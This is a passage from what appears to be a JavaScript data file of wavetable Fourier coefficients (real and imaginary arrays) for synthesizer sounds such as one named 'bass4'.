0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ],  imag: [ 0, .492288, .009944, .032169, .001931, .019775, .001332, .00657, .001131, .004102, .00065, .000918, .000445, .000083, .000082, -.000726, -.000113, -.00063, -.000292, -.000559, -.000277, -.000299, -.000256, -.000153, -.000139, -.000007, -.000037, .000032, .000048, .000041, .00009, .000033, .00009, .000007, .000059, .000009, .000029, .000004, -.000003, .000013, -.000016, .000022, -.000006, .00003, .000007, .000024, .00003, .000031, .000037, .000023, .000037, .000021, .000029, .000019, .000009, .000007, -.000006, .000005, -.000013, -.000003, -.000015, -.000009, -.000008, -.000008, 0, -.000008, .000008, -.000003, .000017, .000005, .00001, .00001, .000008, .000012, .000004, .00001, -.000004, .000004, -.000002, .000006, -.000003, -.000001, -.000002, -.000003, .000004, -.000003, .000004, .000002, .000006, .000006, .000008, .000007, .000004, .000005, .000004, .000005, 0, .000002, -.000001, -.000001, -.000001, -.000002, 0, -.000002, .000002, -.000002, 0, 0, -.000001, .000001, .000001, .000004, .000002, 0, .000005, .000002, .000002, .000001, -.000001, -.000002, -.000003, -.000002, 0, -.000002, -.000003, 0, -.000004, .000002, -.000003, -.000001, .000002, .000001, -.000002, 0, .000001, -.000002, .000003, -.000002, 0, 0, -.000001, -.000005, -.000002, -.000003, -.000002, -.000002, -.000001, .000001, -.000002, .000001, -.000001, -.000002, .000002, .000001, .000004, -.000001, .000002, -.000003, -.000001, -.000001, .000001, .000001, -.000003, 0, -.000002, .000002, -.000001, -.000002, 0, 0, .000001, -.000002, -.000002, .000001, .000002, .000001, 0, -.000001, -.000001, 0, -.000001, .000001, -.000002, .000001, -.000001, -.000001, .000001, -.000003, 0, -.000001, .000001, -.000001, .000001, 0, 0, -.000001, .000003, .000001, -.000001, .000001, -.000001, .000001, -.000002, 0, .000001, -.000001, 0, -.000001, .000001, .000003, -.000003, 0, .000001, 0, 0, .000001, 0, -.000001, -.000001, 0, .000001, -.000002, -.000001, -.000002, -.000002, 0, -.000001, 0, -.000001, .000001, -.000001, -.000001, -.000002, -.000002, -.000001, .000001, .000003, -.000001, .000003, 0, -.000003, -.000002, -.000002, .000001, -.000001, .000002, 0, -.000003, -.000001, -.000001, .000001, -.000002, -.000002, 0, -.000001, 0, -.000002, .000001, -.000002, 0, -.000002, 0, -.000001, -.000001, .000001, .000002, -.000004, 0, -.000001, .000001, .000002, -.000002, .000002, -.000001, -.000002, .000001, 0, .000001, 0, -.000002, -.000002, 0, .000001, 0, 0, -.000001, .000001, 0, -.000002, .000001, 0, -.000003, .000002, -.000001, -.000001, .000001, 0, -.000001, .000001, .000001, -.000001, 0, 0, -.000002, -.000003, -.000002, -.000001, 0, 0, -.000001, .000002, .000001, .000002, .000002, .000001, -.000001, 0, .000002, .000002, -.000002, -.000002, .000001, -.000001, 0, .000001, -.000001, .000002, 0, -.000001, .000001, -.000001, -.000004, .000002, 0, 0, -.000002, 0, -.000001, 0, -.000002, -.000002, -.000002, -.000001, -.000002, -.000001, 0, 0, -.000002, -.000001, -.000002, -.000003, -.000003, -.000003, -.000003, -.000004, -.000004, -.000002, -.000003, -.000003, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "bass4",       { real: [ 0, .001056, -.371626, -.038289, -.241364, .065179, -.127552, .014426, -.00302, -.014399, -.01333, .003929, -.013432, .007582, -.002041, -.000047, .003094, -.002225, -.000156, .000395, -.000159, .00016, .000402, .000149, .000178, .00003, .000372, -.000328, .000189, -.000124, .000033, -.000099, .000096, .000033, .000028, .000108, .000076, .000039, .000098, .000036, .000002, .000056, .000063, -.000052, .000077, .000001, .000032, -.00001, .000019, -.000029, .000014, -.000008, .000004, -.000003, .000016, -.000008, -.000004, -.000003, .000008, .000009, -.000007, .000004, .000004, .000011, .000005, -.000003, .000003, -.000004, .000001, -.000005, .000009, -.000007, .000005, .000002, -.000001, .000008, 0, -.000009, -.000004, -.000001, -.000009, .000007, -.000004, .000003, -.000005, .000004, .000013, -.000003, .000006, .000006, .000009, -.000003, -.000001, .000004, -.000004, -.000005, .000003, -.000005, .000004, .000002, -.000011, -.000006, .000008, .000008, -.000008, -.000003, -.000005, .000005, -.000009, .000009, .000001, -.000002, -.000006, .000001, .000006, 0, .000001, .000003, -.000008, .000002, 0, -.000006, -.000003, .000005, .00001, .000007, .000002, -.000004, .000003, 0, .000002, .000001, .000007, .000011, -.000004, .000005, .000002, -.000001, -.000004, .000013, .000007, .000003, .000001, 0, -.000001, .000005, -.000005, -.000005, .000003, .000002, .00001, -.000001, -.000002, .000002, 0, 0, .000003, -.000005, .000008, .000003, -.000005, .000002, .000001, .000001, .000003, .000001, .000011, .000002, -.000003, .000008, 0, -.000004, .000002, .000005, .000006, -.000007, .000005, 0, -.000005, .000004, .000001, .000003, .000013, .000004, .000004, .000001, .000003, .000005, -.000002, .000005, .000005, .000002, .000007, .000009, .000006, 0, -.000002, .000002, 0, -.000002, .000004, -.000006, .000004, .000004, .000008, -.000004, .00001, .000005, .000008, -.000002, .000005, .000005, .000014, .000002, .000008, .000003, .000005, .000002, .000011, -.000007, .000001, 0, -.000003, 0, .000006, .000006, .000004, .00001, .000009, .000004, .000001, .000001, .000005, .000002, -.000004, 0, .000004, .000003, .000008, 0, .000008, -.000004, .000006, .000009, -.000003, .000004, .000008, .000003, .000007, .000007, .000003, .000002, .000006, .000019, .000001, .000006, -.000005, -.000004, .00001, -.000001, .00001, -.00001, .00001, .000005, .00001, .000006, .000011, -.000001, .000008, .000004, 0, .000004, .000001, .000006, .000013, .000013, .000012, .000009, .000004, .000004, .000003, .000003, .000015, .000012, .000015, .000007, .000013, .000006, .000014, .000014, .000012, .000013, .000012, .000015, .000019, .000013, .00001, .000009, .000006, .000001, .000007, .000006, 0, -.000004, -.000008, -.000007, -.00001, -.000011, -.000011, -.000012, -.000012, -.000013, -.000013, -.000012, -.000012, -.000012, -.000011, -.00001, -.00001, -.000009, -.000009, -.000008, -.000007, -.000007, -.000007, -.000006, -.000006, -.000006, -.000005, -.000005, -.000005, -.000005, -.000005, -.000004, -.000004, -.000004, -.000004, -.000004, -.000004, -.000004, -.000004, -.000004, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000003, -.000002, -.000002, -.000003, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000002, -.000001, -.000002, -.000002, -.000002, -.000001, -.000001, -.000002, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, -.000001, -.000001, -.000001, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, -.000001, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 